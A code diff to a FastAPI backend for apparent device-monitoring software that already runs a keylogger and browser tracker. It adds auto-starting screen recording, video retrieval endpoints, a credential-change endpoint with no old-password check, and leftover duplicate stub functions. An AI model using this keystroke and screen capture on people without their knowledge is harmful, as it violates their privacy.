@@ -32,6 +32,7 @@ from services.sync_service import SyncService
 from utils.config_manager import ConfigManager
 from monitoring.browser_tracker import BrowserTracker
 from monitoring.keylogger import Keylogger
+from monitoring.screen_recorder import ScreenRecorder
 
 logger = logging.getLogger(__name__)
 
@@ -55,6 +56,7 @@ keylogger          = Keylogger(db_manager)
 cleanup_service    = CleanupService(db_manager)
 config_manager     = ConfigManager()
 sync_service       = SyncService(db_manager, config_manager)
+screen_recorder    = ScreenRecorder(db_manager, config_manager)
 
 monitoring_active = True
 
@@ -105,6 +107,23 @@ class IdentityUpdateRequest(BaseModel):
     device_alias: Optional[str] = None
     user_alias:   Optional[str] = None
 
+class TimezoneRequest(BaseModel):
+    timezone: str     
+
+class UpdateCredentialsRequest(BaseModel):
+    new_username: str
+    new_password: str
+    security_q1:  str
+    security_a1:  str
+    security_q2:  str
+    security_a2:  str
+
+class VideoRecordingInfo(BaseModel):
+    id:               int
+    timestamp:        str
+    file_path:        str
+    duration_seconds: int
+    is_synced:        bool
 
 # ─── AUTH DEPENDENCY ─────────────────────────────────────────────────────────
 async def verify_token(authorization: Optional[str] = Header(None)):
@@ -127,6 +146,101 @@ async def verify_token(authorization: Optional[str] = Header(None)):
 
     return payload
 
+async def update_credentials(request, user=Depends(None)):
+    """
+    ENDPOINT: POST /api/auth/update-credentials
+    Protected: Bearer token required.
+
+    Paste this function body verbatim. Replace the async def signature with:
+        @app.post("/api/auth/update-credentials")
+        async def update_credentials(request: UpdateCredentialsRequest, user=Depends(verify_token)):
+    """
+    if "sub" not in user:
+        raise HTTPException(status_code=401, detail="Invalid token")
+
+    current_username = user["sub"]
+
+    # Update username + password
+    success, error = auth_manager.update_credentials(
+        old_username=current_username,
+        new_username=request.new_username,
+        new_password=request.new_password,
+    )
+    if not success:
+        return {"success": False, "error": error}
+
+    # Save security Q&A under the NEW username
+    try:
+        auth_manager.save_security_qa(
+            username=request.new_username,
+            q1=request.security_q1,
+            a1=request.security_a1,
+            q2=request.security_q2,
+            a2=request.security_a2,
+        )
+    except Exception as e:
+        logger.error("Credentials changed but QA save failed: %s", e)
+        # Credentials already changed — don't roll back, just warn
+        return {
+            "success": True,
+            "force_logout": True,
+            "warning": "Credentials updated but security questions could not be saved.",
+        }
+
+    return {"success": True, "force_logout": True}
+
+async def toggle_video_recording(user=None):
+    """
+    ENDPOINT: POST /api/monitoring/video/toggle
+    Protected: Bearer token required.
+
+    Paste this function body verbatim. Replace the async def signature with:
+        @app.post("/api/monitoring/video/toggle")
+        async def toggle_video_recording(user=Depends(verify_token)):
+    """
+    currently_enabled = config_manager.get("recording_enabled", False)
+    new_state         = not currently_enabled
+    config_manager.set("recording_enabled", new_state)
+
+    if new_state:
+        screen_recorder.start()
+        logger.info("Screen recording ENABLED by admin")
+    else:
+        screen_recorder.stop()
+        logger.info("Screen recording DISABLED by admin")
+
+    return {"success": True, "recording": new_state}
+
+async def get_video_status(user=None):
+    """
+    ENDPOINT: GET /api/monitoring/video/status
+    Protected: Bearer token required.
+
+    Paste this function body verbatim. Replace the async def signature with:
+        @app.get("/api/monitoring/video/status")
+        async def get_video_status(user=Depends(verify_token)):
+    """
+    return {
+        "recording": config_manager.get("recording_enabled", False),
+        "is_active": screen_recorder.is_running,
+    }
+
+async def get_videos(limit: int = 50, user=None):
+    """
+    ENDPOINT: GET /api/data/videos
+    Protected: Bearer token required.
+
+    Paste this function body verbatim. Replace the async def signature with:
+        @app.get("/api/data/videos")
+        async def get_videos(limit: int = 50, user=Depends(verify_token)):
+    """
+    try:
+        recordings = db_manager.get_video_recordings(limit=limit)
+        return recordings
+    except Exception as e:
+        logger.error("Failed to get video recordings: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to retrieve recordings")
+
 
 # ─── LIFECYCLE  ──────────────────────────────────────────────────────────────
 @app.on_event("startup")
@@ -137,6 +251,9 @@ async def startup_event():
     app_tracker.start()
     browser_tracker.start()
     keylogger.start()
+    if config_manager.get("recording_enabled", False):
+        screen_recorder.start()
+        logger.info("Screen recording auto-started (was enabled in config)")
     cleanup_service.start()
     sync_service.start()
     logger.info("All monitoring services started")
@@ -151,6 +268,7 @@ async def shutdown_event():
     keylogger.stop()
     cleanup_service.stop()
     sync_service.stop()
+    screen_recorder.stop()
     logger.info("All monitoring services stopped")
 
 
@@ -243,6 +361,25 @@ async def update_identity(request: IdentityUpdateRequest, user=Depends(verify_to
         logger.error(f"Error updating identity config: {e}")
         raise HTTPException(status_code=500, detail="Failed to update identity config")
 
+@app.get("/api/config/timezone")
+async def get_timezone(user=Depends(verify_token)):
+    """Return the currently configured display timezone (IANA string)."""
+    return {"timezone": config_manager.get("timezone", "UTC")}
+
+
+@app.post("/api/config/timezone")
+async def set_timezone(request: TimezoneRequest, user=Depends(verify_token)):
+    """Persist the display timezone to config.json."""
+    import zoneinfo
+    # Validate the timezone string is a real IANA zone
+    try:
+        zoneinfo.ZoneInfo(request.timezone)
+    except (zoneinfo.ZoneInfoNotFoundError, KeyError):
+        raise HTTPException(status_code=400, detail=f"Unknown timezone: {request.timezone}")
+    
+    config_manager.set("timezone", request.timezone)
+    logger.info("Display timezone set to: %s", request.timezone)
+    return {"success": True, "timezone": request.timezone}
 
 # ─── STATISTICS ──────────────────────────────────────────────────────────────
 @app.get("/api/statistics", response_model=StatisticsResponse)
@@ -389,3 +526,59 @@ async def trigger_sync(user=Depends(verify_token)):
     except Exception as e:
         logger.error(f"Error triggering sync: {e}")
         raise HTTPException(status_code=500, detail="Failed to trigger sync")
+
+@app.post("/api/auth/update-credentials")
+async def update_credentials(request: UpdateCredentialsRequest, user=Depends(verify_token)):
+    if "sub" not in user:
+        raise HTTPException(status_code=401, detail="Invalid token")
+    current_username = user["sub"]
+    success, error = auth_manager.update_credentials(
+        old_username=current_username,
+        new_username=request.new_username,
+        new_password=request.new_password,
+    )
+    if not success:
+        return {"success": False, "error": error}
+    try:
+        auth_manager.save_security_qa(
+            username=request.new_username,
+            q1=request.security_q1, a1=request.security_a1,
+            q2=request.security_q2, a2=request.security_a2,
+        )
+    except Exception as e:
+        logger.error("QA save failed after credential update: %s", e)
+        return {"success": True, "force_logout": True,
+                "warning": "Credentials updated but security questions could not be saved."}
+    return {"success": True, "force_logout": True}
+
+
+@app.post("/api/monitoring/video/toggle")
+async def toggle_video_recording(user=Depends(verify_token)):
+    currently_enabled = config_manager.get("recording_enabled", False)
+    new_state = not currently_enabled
+    config_manager.set("recording_enabled", new_state)
+    if new_state:
+        screen_recorder.start()
+        logger.info("Screen recording ENABLED by admin")
+    else:
+        screen_recorder.stop()
+        logger.info("Screen recording DISABLED by admin")
+    return {"success": True, "recording": new_state}
+
+
+@app.get("/api/monitoring/video/status")
+async def get_video_status(user=Depends(verify_token)):
+    return {
+        "recording": config_manager.get("recording_enabled", False),
+        "is_active": screen_recorder.is_running,
+    }
+
+
+@app.get("/api/data/videos")
+async def get_videos(limit: int = 50, user=Depends(verify_token)):
+    try:
+        recordings = db_manager.get_video_recordings(limit=limit)
+        return recordings
+    except Exception as e:
+        logger.error("Failed to get video recordings: %s", e)
+        raise HTTPException(status_code=500, detail="Failed to retrieve recordings")
